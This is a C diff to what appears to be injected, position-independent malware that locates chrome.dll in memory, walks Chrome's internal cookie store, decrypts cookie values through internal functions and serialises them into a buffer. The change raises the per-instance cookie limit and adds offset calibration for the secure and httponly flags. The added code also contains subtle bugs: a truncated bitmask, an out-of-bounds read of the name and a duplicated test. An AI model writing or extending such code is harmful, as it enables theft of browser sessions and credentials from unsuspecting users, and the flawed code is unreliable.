@@ -143,7 +143,7 @@ static PIC_CODE pic_bool engine_a_write_u32(pic_u8 **cursor,
 
 /* --- CookieMonster tree walk --- */
 
-#define MARGARET_MAX_COOKIES_PER_INSTANCE 512u
+#define MARGARET_MAX_COOKIES_PER_INSTANCE 4096u
 #define MARGARET_MAX_TREE_DEPTH 64u
 /* Scan-hit budget.  False positives (the vtable VA copied onto
  * thread stacks or into low heaps during init) are cheap: the
@@ -276,13 +276,114 @@ static PIC_CODE pic_uptr engine_a_tree_next(const pic_u8 *node,
 
 typedef void (PIC_MS_ABI *PIC_COOKIE_VALUE_FN)(void *out, void *cookie);
 
+/* --- flags auto-calibration ------------------------------------------
+ *
+ * The CanonicalCookie struct contains adjacent bool members secure_ and
+ * httponly_.  Their absolute offset shifts across patch-level rebuilds,
+ * so instead of hardcoding it we discover it at runtime using the
+ * RFC 6265bis __Secure- prefix as ground truth: a cookie with that
+ * prefix MUST have secure_=true (Chrome enforces it at the jar level).
+ *
+ * A 32-bit mask tracks candidate byte offsets in [+0x100..+0x11F]:
+ *   bit N = offset 0x100+N.  __Secure- cookies eliminate candidates
+ *   where the byte is 0; non-Secure cookies eliminate candidates where
+ *   the byte is non-zero.  When one candidate remains, that is the
+ *   secure_ offset; httponly_ is the adjacent byte.  Fail-closed: if
+ *   calibration is ambiguous, flags output as 0. */
+#define FLAGS_SCAN_BASE   0x100u
+#define FLAGS_SCAN_WIDTH  0x20u   /* 32 candidate offsets */
+#define FLAGS_ALL_CAND    0xFFFFFFFFu /* all 32 bits = all candidates */
+
+typedef struct PIC_FLAGS_CAL {
+    pic_u32 candidates;  /* bitmask of surviving candidate offsets */
+    pic_u8  calibrated;  /* 0 = in progress, 1 = done, 2 = failed */
+    pic_u8  secure_off;  /* calibrated offset (relative to cookie) */
+} PIC_FLAGS_CAL;
+
+static PIC_CODE void engine_a_flags_cal_update(
+    PIC_FLAGS_CAL *cal, const pic_u8 *cookie, const pic_u8 *name,
+    pic_u32 name_len)
+{
+    pic_u32 i;
+
+    if (cal == PIC_NULL || cookie == PIC_NULL || cal->calibrated != 0u) {
+        return;
+    }
+
+    /* is this a __Secure- prefixed cookie? (8 bytes minimum) */
+    {
+        pic_u8 is_secure = 0u;
+        if (name_len >= 8u && name[0u] == (pic_u8)'_' &&
+            name[1u] == (pic_u8)'_' && name[2u] == (pic_u8)'S' &&
+            name[3u] == (pic_u8)'e' && name[4u] == (pic_u8)'c' &&
+            name[5u] == (pic_u8)'u' && name[6u] == (pic_u8)'r' &&
+            name[7u] == (pic_u8)'e' && name[8u] == (pic_u8)'-') {
+            is_secure = 1u;
+        }
+
+        for (i = 0u; i < FLAGS_SCAN_WIDTH; i++) {
+            pic_u8 bit = 1u << i;
+            if ((cal->candidates & bit) == 0u) {
+                continue;
+            }
+            {
+                pic_u8 b = cookie[FLAGS_SCAN_BASE + i];
+                if (is_secure && b == 0u) {
+                    cal->candidates &= (pic_u32)~bit;
+                } else if (!is_secure && b != 0u) {
+                    /* only eliminate if we're sure this cookie is NOT
+                     * secure: __Host- is also secure, and we can't
+                     * know for arbitrary names — so only eliminate on
+                     * cookies we're CONFIDENT are non-secure (short
+                     * tracking/analytics names without any prefix) */
+                    if (name_len < 8u ||
+                        (name[0u] != (pic_u8)'_' && name[0u] != (pic_u8)'_')) {
+                        cal->candidates &= (pic_u32)~bit;
+                    }
+                }
+            }
+        }
+
+        /* exactly one candidate left? calibrated */
+        if (cal->candidates != 0u &&
+            (cal->candidates & (cal->candidates - 1u)) == 0u) {
+            /* single bit set */
+            for (i = 0u; i < FLAGS_SCAN_WIDTH; i++) {
+                if (cal->candidates & (1u << i)) {
+                    cal->secure_off = (pic_u8)(FLAGS_SCAN_BASE + i);
+                    cal->calibrated = 1u;
+                    return;
+                }
+            }
+        }
+        if (cal->candidates == 0u) {
+            cal->calibrated = 2u; /* failed: contradictory evidence */
+        }
+    }
+}
+
+static PIC_CODE pic_u32 engine_a_flags_read(
+    const PIC_FLAGS_CAL *cal, const pic_u8 *cookie)
+{
+    if (cal == PIC_NULL || cookie == PIC_NULL || cal->calibrated != 1u) {
+        return 0u; /* fail-closed */
+    }
+    /* pack: bit 0 = secure_ (bool), bit 1 = httponly_ (adjacent bool) */
+    {
+        pic_u8 secure = cookie[cal->secure_off];
+        pic_u8 httponly = cookie[cal->secure_off + 1u];
+        return (pic_u32)(secure & 1u) | ((pic_u32)(httponly & 1u) << 1u);
+    }
+}
+
 static PIC_CODE pic_bool engine_a_serialize_cookie(
     const pic_u8 *cookie,
     pic_u8 **cursor,
     pic_u32 *remaining,
     const pic_u8 *chrome_base,
     pic_uptr value_fn,
-    pic_uptr deobf_fn)
+    pic_uptr deobf_fn,
+    PIC_FLAGS_CAL *flags_cal)
 {
     PIC_CC_STRING_VIEW name;
     PIC_CC_STRING_VIEW domain;
@@ -360,9 +461,13 @@ static PIC_CODE pic_bool engine_a_serialize_cookie(
         }
     }
 
-    /* flags dword at +0x128 (secure/httponly packed) */
+    /* flags: auto-calibrated secure_/httponly_ bools (see above);
+     * the update happens AFTER the name is read, so the first few
+     * cookies may output 0 until calibration converges */
+    engine_a_flags_cal_update(flags_cal, cookie,
+                              name.data, name.length);
     if (!engine_a_write_u32(cursor, remaining,
-                             engine_a_read_u32(cookie + 0x128))) {
+                            engine_a_flags_read(flags_cal, cookie))) {
         return PIC_FALSE;
     }
 
@@ -465,6 +570,10 @@ PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
 
     cookie_count = 0u;
     instance_count = 0u;
+    PIC_FLAGS_CAL flags_cal;
+    flags_cal.candidates = FLAGS_ALL_CAND;
+    flags_cal.calibrated = 0u;
+    flags_cal.secure_off = 0u;
     status = (pic_u32)MARGARET_STATUS_OK;
 
     /* discover chrome.dll base */
@@ -608,7 +717,8 @@ PIC_CODE pic_u32 PIC_MS_ABI margaret_engine_a_snapshot(
                                         if (engine_a_serialize_cookie(
                                                 cookie, &cursor, &remaining,
                                                 (const pic_u8 *)chrome_base,
-                                                value_fn, deobf_fn)) {
+                                                value_fn, deobf_fn,
+                                                &flags_cal)) {
                                             cookie_count++;
                                         } else {
                                             /* buffer full: stop everything */
